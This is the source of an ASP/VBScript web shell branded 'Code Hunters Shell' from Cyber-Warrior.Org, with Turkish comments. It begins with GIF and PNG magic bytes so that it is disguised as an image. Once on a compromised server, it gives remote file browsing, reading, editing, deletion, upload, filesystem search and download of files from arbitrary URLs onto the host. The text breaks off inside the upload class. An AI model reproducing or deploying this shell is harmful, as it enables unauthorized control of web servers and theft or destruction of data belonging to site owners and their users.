GIF89;a
‰PNG
<%@Language = VbScript CodePage = 1254%>
<%
' ####
' ### Code Hunters TIM/Asi_besiktasli Tarafyndan Cyber-Warrior.Org için yazylmy?tyr. / 14.07.2011
' ### Misyon Dahilinde Kullanmanyz Dile?iyle...
' ####

'Karakter Kodlamasy
Session.CodePage=1254

%>
<html>
<head>
<title>Code Hunters Shell</title>
<meta http-equiv="Content-Type" content="text/html; charSet=iso-8859-9">
</head>
<style type="text/css">
	body, table{
	background-color:#000;
	color:#00ff00;
	font-family:Verdana, Geneva, sans-serif;
	font-size:12px;
	}
	#baslik{
	font-family:Verdana, Geneva, sans-serif;
	font-size:18px;
	font-weight:bold
	}
	#drivers{
	font-weight:bold
	}
	a{
	color:#00ff00;
	text-decoration:none
	}
	a:hover{
	color:#F00;
	text-decoration:overline underline
	}
	input{
	font-family:tahoma;
	background-color:#000;
	color:#00ff00	
	}
	
div#path{
position:fixed;
top:0px;
left:0px;
width:100%;
background-color:#000;
height:55px;
font-size:10px;
z-index:5;
font-weight:bold;
color:#00ff00;
padding-left:5px;
font-size:12px;
font-family:tahoma
}

* html div#path{
position: absolute !important;
top: expression(((document.documentElement.scrollTop || document.body.scrollTop) + this.offsetHeight-90) + ""px"");
left:0px;
width:100%;
background-color:#000;
height:25px;
font-size:10px;
z-index:5;
font-weight:bold;
color:#00ff00;
padding-left:5px
}

</style>
<script>
function CodeHuntersPopup(){
yeniPencere = window.open('', 'hakkimizda','height=500,width=600,resizable=0,status=0,left=100,top=50,scrollbars=0,menubar=0,toolbar=0');
yeniPencere.document.write('<title>Code Hunters TIM - Asi_Besiktasli</title><style type="text/css">body{background-color:#000;color:#00ff00;font-family:Verdana, Geneva, sans-serif;font-size:12px;}</style> By Cyber-Warrior Code Hunters TIM , Codded by Code Hunters TIM for Cyber-Warrior users. We wish good use...')}
</script>
<body>
<br><br><br><br>
<div id="baslik" align="center"><img src="http://teknolojiport.org/1.jpg" style="cursor:pointer" alt="Hakkymyzda" title="Hakkymyzda" onclick="CodeHuntersPopup()"></div><br>
<br>
<%
'Dosya Yolu Urlden Çekiliyor / karakteri \ karakteri olarak de?i?tiriliyor
Path=Replace(Request.QueryString("Path"),"/","\")


islem=Request.QueryString("islem")

'Fso nesnesini olu?turuyoruz.
Set Fso=Server.Createobject("Scripting.FileSystemObject")

'E?er dosyayolu bo? ise dosya yolu shellimizin bulundu?u klasöre ayarlanyyor

If Path="" Then
Path = Server.Mappath("/")

ElseIf FSO.FolderExists(Path)=false Then
If islem="" Then
Path = FSO.GetParentFolderName(path)
End If

End If

'Code Hunters TIM  2011

If islem="" And Not Right(Path,1)="\" Then
Path = Path & "\"
End If


If islem<>"" Then
Dizin = Mid(Path,1,Instrrev(Path,"\"))
Else
Dizin = Path
End If

' Sayfanyn Üstünde Sabit Duracak Olan Dizin Formu yazdyrylyyor
Response.Write("<div id=""path""><form action=""?islem=git"" method=""post""> Bulundu?unuz Dizin <input type=""text"" name=""path"" size=""90"" value="""&Dizin&"""><input type=""submit"" value=""Git""> <a href=""?islem=Upload&Path="&Path&""">Upload</a> | <a href=""?islem=Search&Path="&Path&""">Dosya Arama</a> | <a href=""?islem=Dosyaindir&Path="&Path&""">Dosya Indir</a></form><a href=""?Path="" style=""font-weight:bold;text-decoration:underline"">ROOT(Ana Klasör)</a>")&vbcrlf

' Fso ile Serverdaki Sürücülere Ula?yyoruz
Set Suruculer = FSO.Drives

If Not islem="Drivers" Then

Response.Write " || <span id=""drivers""><a href=""?islem=Drivers"" style=""text-decoration:underline"">Sürücüler:</a> </span>"
' Serverda ki Mevcut Sürücüler Yazdyrylyyor
For Each Surucu in Suruculer
    Response.Write ("<a href=""?Path="&Surucu.DriveLetter&":"" style=""text-decoration:underline"">"&Surucu.DriveLetter&":\</a> ")&vbcrlf
Next

End If
   

    On Error GoTo 0
    On Error Resume Next
    Response.Write(" Klasör izinleri: ")
	
	 
	'A?a?yda önce geçici bir dosya olu?turacaz olu?turabiliyor ise yazma yetkisi var yazacak. Dosyayy okuyabiliyosa okuma yetkisi var yazacak. Dosyayy silebiliyorsa silme yetkisi var yazacak.
				
	'Yazma Yetkisi	
	Set DosyaOlustur = Fso.CreateTextFile(Dizin & "\CodeHunters.txt", True)
    Set DosyaOlustur = Nothing
	'Hata verirse yazma yetkisi yok, Hata vermezse yazma yetkisi var
    
	If Err<>0 then
    Response.Write "Yazma Yetkisi Yok | "
    Else
    Response.Write "Yazma Yetkisi Var | "
	End If
	
' E?er 	Yazma Yetkisinde Hata verirse silme yetkisinde vermemesi için a?a?ydaki kodlary yazyyoruz

	On Error GoTo 0
	On Error Resume Next
	
	'Okuma Yetkisi
	
	'Dosyayy okumak için açyyoruz
	'Hata verirse okuma yetkisi yok, Hata vermezse okuma yetkisi var

	Set DosyaOku= Fso.OpenTextFile(Dizin & "\CodeHunters.txt")
	Set DosyaOku=Nothing
	
	If Err<>0 then
    Response.Write "Okuma Yetkisi Yok | "
    Else
	Response.Write "Okuma Yetkisi Var | "
	End If
	
	On Error GoTo 0
	On Error Resume Next
	
	'Silme Yetkisi
	
	'Olu?turulan Geçici Dosya Siliniyor
	'Hata verirse silme yetkisi yok hata vermezse silme yetkisi var
	Fso.DeleteFile Dizin&"\CodeHunters.txt",true
	
	If Err<>0 then
    Response.Write "Silme Yetkisi Yok "
    Else
	Response.Write "Silme Yetkisi Var "
	End If
	
	On Error GoTo 0
	On Error Resume Next
	
	Response.Write("</div>")&vbcrlf

' islem De?i?kenine Göre Farkly Sayfalar Çykarylyyor
Select Case islem
Case "git"
'Dizin formu bu sayfaya yollanyyor. Bu sayfada formdan gelen bilgiye göre kullanycyyy yönlendiriyor
If Len(Request.Form("path"))>0 Then
Response.Redirect("?Path="&Request.Form("path"))
End If
Case ""

' Urlden alynan Path Hazyr hale getiriliyor
Set Klasor = FSO.GetFolder(Path)

' Dizindeki Alt Klasörler Çekiliyor
Set AltKlasorler = Klasor.SubFolders

' Dizindeki Dosyalar Çekiliyor
Set Dosyalar = Klasor.Files

'Üst Klasör Varsa Link Ayarlanyyor
If Klasor.IsRootFolder = False Then
Set UstKlasor = Klasor.ParentFolder
Response.Write "<br><a href=""?Path="& UstKlasor.Path &""">< Üst Klasöre Git</a>"
End If

Response.Write(" <b>"& Klasor.Path &"</b>  | <a href=""?islem=CreateFolder&Path="&Path&""">Klasör Olu?tur</a> | <a href=""?islem=CreateFile"">Dosya Olu?tur</a>" & vbCrLf)

Response.Write("<table width=""95%"" cellpadding=""4"" cellspacing=""1"" >")%><br><br>

<tr style="font-weight:bold; background-color:#484848">
<td width="30" class="baslik">Isim</TD><td width="15%" class="baslik">Dosya Boyutu</TD><td width="25%" class="baslik">Tür</TD><td width="35%" class="baslik">Y?lem</TD>
</tr>
<%
' Dizindeki Alt Klasörleri Yazdyryyoruz
For Each AltKlasor In AltKlasorler
    With Response
    .Write("<tr style=""background-color:#313131"" onmouseover=""this.style.background='#444444'"" onmouseout=""this.style.background='#313131'""><td><a href=""?Path="& AltKlasor.Path &""" style=""display:block"">"& AltKlasor.Name &"</a></td>") & vbCrLf
    .Write("<td></td><td>Dosya Klasörü</td>") & vbCrLf 
    .Write("<td><a href=""?islem=FolderRename&path="&AltKlasor.Path&""">Isim De?i?tir</a> | <a  href=""?islem=FolderMove&Path="&AltKlasor.Path&""">Ta?y</a> | <a href=""?islem=FolderCopy&Path="&AltKlasor.Path&""">Kopyala</a> | <a href=""?islem=FolderDelete&Path="&AltKlasor.Path&""">Sil</a></td></tr>")
	End With
Next

' Dizindeki Dosyalary Yazdyryyoruz
For Each Dosya In Dosyalar
	With Response
	.Write "<tr style=""background-color:#3F3F3F"" onmouseover=""this.style.background='#4B4B4B'"" onmouseout=""this.style.background='#3F3F3F'"">" & vbCrlf
    .Write "<td class=""doslist""><a href=""?islem=Read&Path="& Dosya.path &""" style=""display:block"">"&Dosya.name&"</a></td>" & vbCrlf
    .Write "<td>"& Round(Dosya.Size / 1024) &" KB</td>" & vbCrlf
	.Write "<td>"& Dosya.Type &"</td>" & vbCrlf
    .Write "<td><a href=""?islem=Edit&path="&Path&"\"&Dosya.Name&""">Düzenle</a> | <a href=""?islem=FileRename&path="&Path&"\"&Dosya.Name&""">Isim De?i?tir</a> | <a href=""?islem=FileMove&Path="&Dosya.Path&""">Ta?y</a> | <a href=""?islem=FileCopy&Path="&Dosya.Path&""">Kopyala</a> | <a href=""?islem=indir&dosya="&Dosya.Path&""">Indir</a> | <a href=""?islem=FileDelete&Path="&Dosya.Path&""">Sil</a></td>" & vbCrlf
    .Write "</tr>"
	End With
Next
Response.Write("</table>")

' Driver i?lemleri sayfasy
Case "Drivers"

Set Suruculer = FSO.Drives

' Driver ÖZellikleri
Dim Drive_Type
Drive_Type = Array("Bilinmeyen","Çykarylabilir Disk","Sabit Disk","A? Sürücüsü","CD-ROM","RAM-Disk")

Response.Write("<table><tr><td valign=""top""><br><span id=""drivers"">Sürücüler: </span></td>")&vbcrlf

'Bütün Driverlery okumak için döngü kuruluyor
For Each Surucu in Suruculer
    Response.Write ("<td valign=""top""><table><tr><td><a href=""?Path="&Surucu.DriveLetter&":\"">"&Surucu.DriveLetter&":\</a></td></tr>")&vbcrlf
	Response.Write("<tr><td>"&Drive_Type(Surucu.DriveType))&vbcrlf

	'E?er sürücü hazyrsa i?lemleri yap
	If Surucu.isready Then
	Response.Write(" ("&Surucu.VolumeName&")</td></tr>")&vbcrlf
	Response.Write("<tr><td >Dosya Sistemi: "&Surucu.FileSystem&"</td></tr>")&vbcrlf
	toplamalan = (Surucu.TotalSize / 1048576)
	bosalan = (Surucu.AvailableSpace / 1048576)
	Response.Write("<tr><td style=""border:solid 1px""><table height=""10"" width="""&(99-int(bosalan/toplamalan*100))&"%"" cellspacing=""0"" cellpadding=""0"" ><tr><td style=""background-color:#0099FF;color:#fff;font-size:10px;font-weight:bold"">%"&(100-int(bosalan/toplamalan*100))&"</td></tr></table></td></tr>")
	Response.Write("<tr><td>Toplam Kapasite: "&Round(toplamalan,1) & " MB</td></tr>")&vbcrlf
	Response.Write("<tr><td>Bo? Alan: "&Round(bosalan,1) & " MB</td></tr>")&vbcrlf
	End If
	Response.Write("</table></td>")
	Next
	
'---
'	Dosya içeri?ini görüntüleme sayfasy
	Case "Read"
	
	' E?er dosya yoksa hata ver i?lemi durdur
	If FSO.FileExists(Path)= False Then 
	Response.Write("Dosya Bulunamady")
	Response.End
	End If
	
	'Dosyayy hazyr hale getiriliyor
	Set qa = Fso.GetFile(Path)
	
	Response.Write("<br>"&qa.path&" içeri?i<br><br><hr><code>")
	'Dosya açylyyor
	Set Ag = qa.OpenAsTextStream(1,0)
	
	'Dosya Bo?sa Hata Vermesi Engelleniyor
	If Ag.AtEndOfStream Then
	Kod=""
	Else
	'Readall komutuyla dosyanyn içeri?i okunuyor
	kod = Server.HTMLEncode(ag.ReadAll)
	End If
	
	' Readall komutuyla dosya içeri?ini çekince düz yazy ?eklinde geldi?inden satyrlara bölmek için split komutu ile vbcrlf karakteri görülen yerlerden parçalama i?lemi yapyyoruz
	icerik = Split(kod,vbcrlf)
	
	'Split ile parçalanan bölümleri aralaryna <br> ekleyerek satyr haline getiriyoruz
	
	For x=1 to Ubound(icerik)
	Response.Write(icerik(x))&"<br>"&vbcrlf	
	Next
	
	Response.Write("</code><hr>")
	
'---
'	Text, Asp, Php Gibi Uzantyly Yazy Içerikli Dosyalaryn Içeri?ini Düzenleyen Sayfa)
	Case "Edit"
	If Request.QueryString("action")=1 Then
	'Dosyanyn varly?y kontrol ediliyor
	If FSO.FileExists(Path)= False Then 
	Response.Write("Dosya Bulunamady")
	Response.End
	End If
	
	'Dosya hazyr hale getiriliyor
	Set qa = Fso.GetFile(Path)
	'Dosya açylyyor
	Set Ag = qa.OpenAsTextStream(2,0)
	'Dosya içeri?ine formdan yollanan yazy yazylyyor
	Ag.WriteLine(Request.Form("texticerik"))
	Response.Write(qa.Name&" Kayyt Edildi")
	Ag.Close

	Else
	
	'Dosyanyn varly?y kontrole ediliyor
	If FSO.FileExists(Path)= False Then 
	Response.Write("Dosya Bulunamady")
	Response.End
	End If
	
	'Dosya hazyr hale getiriliyor
	Set qa = Fso.GetFile(Path)
	
	Response.Write("<br>"&qa.Name&" içeri?i<br>")

	'Dosya açylyyor
	Set Ag = qa.OpenAsTextStream(1,0)
	
	'Dosya Bo?sa Hata vermesi Engelleniyor
	If Ag.AtEndOfStream Then
	Kod=""
	Else
	'Dosya içeri?i okunuyor kod de?i?kenine aktarylyyor
	Kod = Server.HTMLEncode(ag.ReadAll)
	End If
	
	Ag.Close

	Response.Write("<form action=""?islem=Edit&path="&path&"&action=1"" method=""post""><textarea name=""texticerik"" cols=""80"" rows=""25"">"&kod&"</textarea><br><input type=""submit"" value=""Kaydet""></form>")
	End If
	

'Dosya Ismi De?i?tirme Sayfasy
	Case "FileRename"
	If Request.QueryString("action")=1 Then
	NewName=Request.Form("NewName")
	
	'Dosya hazyr hale getiriliyor
	Set FileRename = FSO.GetFile(Path)
	' Dosyaya Yeni isim veriliyor
	FileRename.Name=Trim(NewName)
	
	Response.Write("<br>Dosya ismi <b>"&Trim(NewName)&"</b> Olarak De?i?tirildi")
	Else
	oldname=Mid(Path,Instrrev(path,"\")+1,Len(path))
	Response.Write("<br><form action=""?islem=FileRename&path="&path&"&action=1"" method=""post""><table><tr><td>Mevcut Isim: </td><td>"&oldname&"</td></tr><tr><td>Yeni isim: </td><td><input type=""text"" name=""newname""></td><tr><tr><td><input type=""submit"" value=""Kaydet""></td></tr></table></form>")
	End If
	

'Klasör Ismi De?i?tirme Sayfasy
	Case "FolderRename"

	If Request.QueryString("action")=1 Then
	NewName=Request.Form("NewName")
	
	'Klasör hazyr hale getiriliyor
	Set FolderRename = FSO.GetFolder(Path)

	'Klasöre yeni isim veriliyor
	FolderRename.Name=Trim(NewName)

	Response.Write("<br>Dosya ismi <b>"&Trim(NewName)&"</b> Olarak De?i?tirildi")
	Else
	oldname=Mid(Path,Instrrev(Left(path,Len(Path)-1),"\")+1,Len(path))
	Response.Write("<br><form action=""?islem=FolderRename&path="&path&"&action=1"" method=""post""><table><tr><td>Mevcut Isim: </td><td>"&oldname&"</td></tr><tr><td>Yeni isim: </td><td><input type=""text"" name=""newname""></td><tr><tr><td><input type=""submit"" value=""Kaydet""></td></tr></table></form>")
	End If
	
'Klasör Ta?yma Sayfasy
	Case "FolderMove"
	'Klasörün varly?y kontrol ediliyor
	If FSO.FolderExists(Path)=False Then
	Response.Write("<br>Klasör Bulunamady")
	Response.End
	End If
		
	If Request.QueryString("action")=1 Then
	
	Set KlasorTasi = FSO.GetFolder(Path)
	
	Hedef=Request.Form("hedef")
	
	'Klasör Ta?ynyyor
	KlasorTasi.Move Hedef
	Response.Write "Klasör "& Hedef & " Dizinine Ta?yndy"
	Else
	Response.Write Path&" Klasörünü Ta?y<br><br><form action=""?islem=FolderMove&action=1&Path="&Path&""" method=""post""><b>Ta?ynacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Dizin&""" size=50><br><input type=""submit"" value=""Ta?y"" style=""width:100px""></form>"
	End If


'Klasör Kopyalama Sayfasy
	Case "FolderCopy"
	'Dosyanyn varly?y kkontrol ediliyor
	If FSO.FolderExists(Path)=False Then
	Response.Write("<br>Klasör Bulunamady")
	Response.End
	End If
	
	If Request.QueryString("action")=1 Then

	'Dosya hazyr hale getiriliyor
	Set KlasorKopyala = FSO.GetFolder(Path)

	Hedef=Request.Form("hedef")

	'Dosya kopyalanyyor
	KlasorKopyala.Copy Hedef

	Response.Write "Klasör "& Hedef & " Dizinine Kopyalandy"
	Else
	Response.Write "<form action=""?islem=FolderCopy&action=1&Path="&Path&""" method=""post""><b>Kopyalanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Path&""" size=50><br><input type=""submit"" value=""Ta?y"" style=""width:100px""></form>"
	End If

'
'Dosya Kopyalama Sayfasy
	Case "FileCopy"
	
	If FSO.FileExists(Path)=False Then
	Response.Write("<br>Dosya Bulunamady")
	Response.End
	End If
	Set DosyaTasi = FSO.GetFile(Path)
	
	If Request.QueryString("action")=1 Then
	Set DosyaKopyala = FSO.GetFile(Path)
	Hedef=Request.Form("hedef")

	DosyaKopyala.Copy Hedef
	Response.Write "Dosya "& Hedef & " Dizinine Kopyalandy"
	Else
	Response.Write "<form action=""?islem=FileCopy&action=1&Path="&Path&""" method=""post""><b>Kopyalanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Path&""" size=50><br><input type=""submit"" value=""Ta?y"" style=""width:100px""></form>"
	End If

'Dosya Ta?yma Sayfasy
	Case "FileMove"
	'Dosyanyn varly?y kontrol ediliyor
	If FSO.FileExists(Path)=False Then
	Response.Write("<br>Dosya Bulunamady")
	Response.End
	End If
	'Dosya kullanym için hazyr hale getiriliyor
	Set DosyaTasi = FSO.GetFile(Path)
	
	If Request.QueryString("action")=1 Then
	
	Hedef=Request.Form("hedef")
	'Dosya ta?ynyyor
	DosyaTasi.Move Hedef
	Response.Write "Dosya "& Hedef & " Dizinine Ta?yndy"
	Else
	Response.Write Path&" Dosyasyny Ta?y<br><br><form action=""?islem=FileMove&action=1&Path="&Path&""" method=""post""><b>Ta?ynacak Dizin: </b><input type=""text"" name=""hedef"" value="""&DosyaTasi.ParentFolder&""" size=50><br><input type=""submit"" value=""Ta?y"" style=""width:100px""></form>"
	End If
	
'Dosya Silme Sayfasy
	Case "FileDelete"
	'Dosyanyn varly?y kontrol ediliyor
	If FSO.FileExists(Path)=False Then
	Response.Write("<br>Dosya Bulunamady")
	Response.End
	End If
	
	'Dosya kullanyma hazyr hale getiriliyor
	Set DosyaSil = FSO.GetFile(Path)
	If Request.QueryString("action")=1 Then
	
	'Dosya siliniyor
	DosyaSil.Delete
	
	Response.Write "Dosya Silindi.<br><br><a href=""?Path="&Mid(Path,1,InStrRev(Path,"\"))&""">Geri Dön</a>"
	Else
	Response.Write("<b>"&Path&"</b><br>Dosyasyny Gerçekten Silmek Istiyor musunuz? <a href=""?islem=FileDelete&action=1&Path="&Path&""">Sil</a> </a>")
	End If
	
'Klasör Silme Sayfasy
	Case "FolderDelete"
	'Klasörün varly?y kontrol ediliyor
	If FSO.FolderExists(Path)=False Then
	Response.Write("<br>Klasör Bulunamady")
	Response.End
	End If
	
	'Klasör hazyr hale getiriliyor
	Set KlasorSil = FSO.GetFolder(Path)
	
	If Request.QueryString("action")=1 Then
	
	'Klasör siliniyor
	KlasorSil.Delete
	Response.Write "Klasör Silindi.<br><br><a href=""?Path="&Mid(Path,1,InStrRev(Path,"\"))&""">Geri Dön</a>"
	Else
	Response.Write("<b>"&Path&"</b><br>Klasörünü ve Içindeki Dosyalary Gerçekten Silmek Istiyor musunuz? <a href=""?islem=FolderDelete&action=1&Path="&Path&""">Sil</a> </a>")
	End If

' Klasör Olu?turma Sayfasy
	Case "CreateFolder"
	If Request.QueryString("action")=1 Then

	'Dosya olu?turuluyor
	Fso.CreateFolder Path&"\"&Trim(Request.Form("foldername"))

	Response.Write(Path&"\"&Trim(Request.Form("foldername"))&" Klasörü olu?turuldu")
	Else
	Response.Write("<form action=""?islem=CreateFolder&action=1&Path="&Path&""" method=""post"">Klasör ady: <input type=""text"" name=""foldername""><input type=""submit"" value=""Olu?tur""></form>")
	End If

' Dosya Olu?turma Sayfasy
	Case "CreateFile"
	If Request.QueryString("action")=1 Then
	
	DosyaAdi = Request.Form("filename")

	'Klasörü Belirtiyoruz
	Set Klasor = FSO.GetFolder(Path)
	'Dosyayy Olu?turuyoruz
	Set DosyaOlustur = Klasor.CreateTextFile(DosyaAdi)
	'Dosya içeri?ini Yazdyyoruz
	DosyaOlustur.Write(Request.Form("icerik"))
	
	Response.Write(Path&"\"&DosyaAdi&" Dosyasy Olu?turuldu")

	DosyaOlustur.Close
	Set DosyaOlustur = Nothing
		
	Else
	Response.Write("<form action=""?islem=CreateFile&action=1&Path="&Path&""" method=""post"">Dosya ady ve uzantysy: <input type=""text"" name=""filename""><br><textarea name=""icerik"" cols=80 rows=25></textarea><br><input style=""width:500px"" type=""submit"" value=""Olu?tur""></form>")
	End If

'upload Y?lemleri
	Case "Upload"


Response.Buffer = True
Response.Expires = 0

Dim oFO, oProps, oFile, i, item, oMyName

Set oFO = New FileUpload

Set oProps = oFO.GetUploadSettings
with oProps
	.UploadDirectory = Path ' dosyanyn yüklenece?i yer
	.AllowOverWrite = true
End with
Set oProps = Nothing
oFO.ProcessUpload
If oFO.TotalFormCount > 0 Then
	If oFO.FileCount > 0 Then
		for i = 1 to oFO.FileCount
			Set oFile = oFO.File(i)
			
			If oFile.ErrorMessage <> "" Then
				Response.Write "&gt; HATA: " & _
					oFile.ErrorMessage & "<BR>"
			Else

				oFile.SaveAsFile
				If oFile.UploadSuccessful Then
					Response.Write "&gt; Basariyla Yüklendi<BR>"

					Response.Write(" - Dosyanin su an bulundu?u URL:<a href="""&oFile.URLPath&"""><font color=""red"">"&	oFile.URLPath & "</font></a><BR>")

					Response.Write(" - Dosya tipi: " & oFile.ContentType & "<BR>")

					Response.Write(" - Dosya ismi: " & oFile.FileName & "<BR>")

					
					Response.Write(" - Dosya boyutu: " & _
						round(formatnumber(oFile.ByteCount, 0)/1024,2) & " KByte<BR>")
				Else
					Response.Write "&gt; Dosyayy yüklerken hata olu?tu: " & _
						oFile.ErrorMessage & "<BR>"
				End If
			End If
			Set oFile = Nothing
		next
	Else
		Response.Write "&gt; Daha önceden bu dosya ile ayni boyutta dosya yüklenmis. Bu durumda ayni dosyayi yüklüyor olabilirsiniz. Eger farkli bir dosya olduguna eminseniz; Dosya boyutunu büyültmek için küçük bir text dosyasini doldurarak zip'li dosyaya ekleyiniz."
	End If


	Response.Write "<BR><BR><A HREF=""?islem=Upload&Path="&Path&""">Tekrar Yükle</A>"
Else

	oFO.ShowUploadForm
End If

Set oFO = Nothing

'Dosya Arama
Case "Search"
Server.ScriptTimeOut=99999
If Request.QueryString("action")="1" Then

Search=Request.Form("Search")
Response.Write "<table width=""95%"" cellpadding=""4"" cellspacing=""1"" align=""left"">"
Sub DosyaAra(KlasorYolu)

Set DosyaAraKlasor = Fso.GetFolder(KlasorYolu)
Set SearchSubFolders = DosyaAraKlasor.SubFolders
Set SearchFiles = DosyaAraKlasor.Files

For Each Dosyax In SearchFiles
If Instr(Dosyax.Name,Search)>0 Then
Response.Write "<tr style=""background-color:#3F3F3F"" onmouseover=""this.style.background='#4B4B4B'"" onmouseout=""this.style.background='#3F3F3F'""><td><a href=""?islem=Edit&Path="&Dosyax.Path&""">"&Dosyax.Path&"</a> </td><td>"&Dosyax.Type&"</td></tr>"
End If
Next

For Each AltKla In SearchSubFolders
If Instr(lcase(AltKla.Name),lcase(Search))>0 Then
Response.Write "<tr style=""background-color:#313131"" onmouseover=""this.style.background='#444444'"" onmouseout=""this.style.background='#313131'""><td><a href=""?Path="&AltKla.Path&""">"&AltKla.Path&"</a> </td><td>"&AltKla.Type&"</td></tr>"
End If
DosyaAra AltKla.Path
Next

End Sub

DosyaAra Path

Else
	Response.Write "<form action=""?islem=Search&action=1&Path="&Path&""" method=""post"">Aranacak Dizin: "&Path&"<br><br>Dosya Adyny Veya Uzantysyny Yazyn <input type=""text"" name=""search""><input type=""submit"" value=""Ara""></form"
End If

'Dosya indirme sayfasy
Case "indir"
Response.Buffer = True

Dosya = Request.QueryString("dosya")

Response.Clear
Response.ContentType = "application/x-msdownload" 
'response.contenttype="application/force-download"
Response.AddHeader "cache-control","private"
Response.AddHeader "content-transfer-encoding", "binary"
Response.AddHeader "content-disposition", "attachment; filename=" & Mid(dosya, instrrev(dosya, "\") + 1, Len(dosya) - instrrev(dosya, "\"))
Set Dosyaindir = Server.CreateObject("Adodb.Stream")
Dosyaindir.type = 1
Dosyaindir.Open
Dosyaindir.LoadFromFile Dosya
Response.BinaryWrite Dosyaindir.Read

Dosyaindir.Close
Set Dosyaindir = Nothing
Response.End

'	Server'a Ba?ka Bir siteden dosya yükleme sayfasy
Case "Dosyaindir"

Url = Request.Form("url")

If Len(Trim(Url))=0 Then

Response.Write("<form action=""?islem=Dosyaindir&Path="&Path&""" method=""post"">Dosyanyn indirilece?i dizin: "&Path&"<br><br>Dosya url: <input type=""text"" name=""url""><input type=""submit"" value=""Indir""></form>")

Else

Set XmlHttp = Server.CreateObject("MSXML2.ServerXMLHTTP")
XmlHttp.Open "GET", Url, False
XmlHttp.Send
IndirilenDosya=XmlHttp.ResponseBody

Set BinaryStream = Server.CreateObject("ADODB.Stream")
BinaryStream.Type = 1
BinaryStream.Open
BinaryStream.Write IndirilenDosya
BinaryStream.SaveToFile Path&"\"&Right(Url,(len(Url)-instrrev(Url,"/"))), 2

Set XmlHttp = Nothing
Set BinaryStream = Nothing

Response.Write "<strong> Dosya "& Path&"\"&Right(Url,(len(Url)-instrrev(Url,"/"))) &"</strong> klasörüne indirildi."

End If

Case "ShellDelete"
FileName=Request.ServerVariables("SCRIPT_NAME")
Fso.DeleteFile Server.Mappath("\")&Replace(FileName,"/","\")
Response.Write("Shell Silindi...")
End Select

If Err.number<>0 Then
Response.Write("<br><br><b>"&Err.description&"</b>")
End If
%>
<br><br><br><br>

<center><a href="?islem=ShellDelete" onClick="return confirm('Code Hunters Shell i Gerçekten Silmek Istiyor musunuz?')"><u>Code Hunters Shelli Serverdan Sil</u></a><br>
<br><u>Code Hunters TIM  © 2011 </u>
</center>
</body>

</html>
<%
'Uplaod Synyfy Ba?langyç
Class FileUpload
	Private UploadRequest, oProps, iFrmCt
	Private iKnownFileCount, iKnownFormCount	
	Private oOutFiles
	
	'Class ba?latylynca çaly?acak sub
	Private Sub Class_Initialize
		iFrmCt = 0
		Set oProps = New FO_Properties
		Set UploadRequest = Server.CreateObject("Scripting.Dictionary")
		iKnownFileCount = 0
		iKnownFormCount = 0
		Set oOutFiles = Server.CreateObject("Scripting.Dictionary")
	End Sub
	
	'Class biti?inde çaly?tyralacak sub
	Private Sub Class_Terminate
		Set oOutFiles = Nothing
		Set UploadRequest = Nothing
		Set oProps = Nothing
	End Sub


	Public Function GetUploadSettings()
		Set GetUploadSettings = oProps
	End Function

	Public Property Get FormCount
		FormCount = iKnownFormCount
	End Property

	Public Property Get FileCount
		FileCount = iKnownFileCount
	End Property

	Public Property Get TotalFormCount
		TotalFormCount = iFrmCt
	End Property

	'form ?ifreleme ayarlary
	Private Function GetFormEncType()
		Dim sContType, hCutOff
		'Içerik ayary yapylyyor
		sContType = Request.ServerVariables("CONTENT_TYPE")
		hCutOff = instr(sContType, ";")
		If hCutOff > 0 Then
			sContType = UCase(Trim(Left(sContType, hCutOff - 1)))
		Else
			sContType = UCase(Trim(sContType))
		End If
		GetFormEncType = sContType
	End Function
	
	
	Public Default Sub ProcessUpload
		Dim RequestBin, oProcess, iTotBytes, key, arr, iKnownProps, oFile
		Dim fofilecheck, sEncType, sReqMeth
	
		'Dosya Boyutu alynyyor		
		iTotBytes = Request.TotalBytes
		If iTotBytes = 0 Then
			iFrmCt = 0
			exit sub
		End If
		'Request.BinaryRead ile yollanan dosyanyn binary kodlary okunuyor
		RequestBin = Request.BinaryRead(iTotBytes)

		sReqMeth = Request.ServerVariables("REQUEST_METHOD")
		Select Case UCase(sReqMeth)
			Case "POST"
				sEncType = GetFormEncType
				Select Case sEncType
					Case "MULTIPART/FORM-DATA"

						Set oProcess = New FO_Processor
						oProcess.BuildUploadRequest  RequestBin, UploadRequest
						Set oProcess = Nothing

					Case "APPLICATION/X-WWW-FORM-URLENCODED"
			
						Set oProcess = New FO_Processor
						oProcess.BuildUploadRequest_ASCII oProcess.getString(RequestBin), UploadRequest
						Set oProcess = Nothing

				End Select

		End Select

		arr = uploadrequest.keys

		If Not isarray(arr) Then
			iFrmCt = 0
			Exit Sub
		End If

		iFrmCt = ubound(arr)
		For Each key In arr
			If isobject(uploadrequest.item(key)) Then
				iKnownProps = ubound(uploadrequest.item(key).keys) + 1
				If iKnownProps = 4 Then
					iKnownFileCount = iKnownFileCount + 1
					Set fofilecheck = new FO_FileChecker
					
					'Dosya ismi, input de?eri gibi bilgiler formdan çekiliyor
					
					fofilecheck.SetCurrentProperties oProps
					fofilecheck.FileInput_NamePath = uploadrequest.item(key).item("FileName")
					fofilecheck.FileInput_ContentType = uploadrequest.item(key).item("ContentType")
					fofilecheck.FileInput_BinaryText = uploadrequest.item(key).item("Value")
					fofilecheck.FileInput_FormInputName = uploadrequest.item(key).item("InputName")
					Set oFile = fofilecheck.ValidateVerifyReturnFile()
					Set fofilecheck = Nothing

					oOutFiles.add iKnownFileCount, oFile
					Set oFile = Nothing
					uploadrequest.remove key
				ElseIf iKnownProps = 2 Then
					iKnownFormCount = iKnownFormCount + 1
				Else
					End If
			End If
		next
	End Sub

	Public Function File(ByVal blobName)
		Dim blobs, blob, subdict, tmpName
		blobs = oOutFiles.Keys
		For Each blob In blobs
			Set subdict = oOutFiles.Item(blob)
			tmpName = subdict.frmInputName
			If UCase(Trim(tmpName)) = UCase(Trim(blobName)) Then
				blobName = blob
				Exit For
			End If
		Next
		If isobject(oOutFiles.Item(blobName)) Then
			Set File = oOutFiles.Item(blobName)
		Else
			Set File = Nothing
		End If
	End Function

	Public Function Form(ByVal inputName)
		If isobject(UploadRequest.Item(inputName)) Then
			Form = UploadRequest.Item(inputName).Item("Value")
		Else
			Form = ""
		End If
	End Function

	Public Function FormLen(ByVal inputName)
		If isobject(UploadRequest.Item(inputName)) Then
			FormLen = Len(UploadRequest.Item(inputName).Item("Value"))
		Else
			FormLen = 0
		End If
	End Function

	Public Function FormEx(ByVal inputName, ByVal vDefaultValue)
		dim vTmp

		If isobject(UploadRequest.Item(inputName)) Then
			vTmp = UploadRequest.Item(inputName).Item("Value")
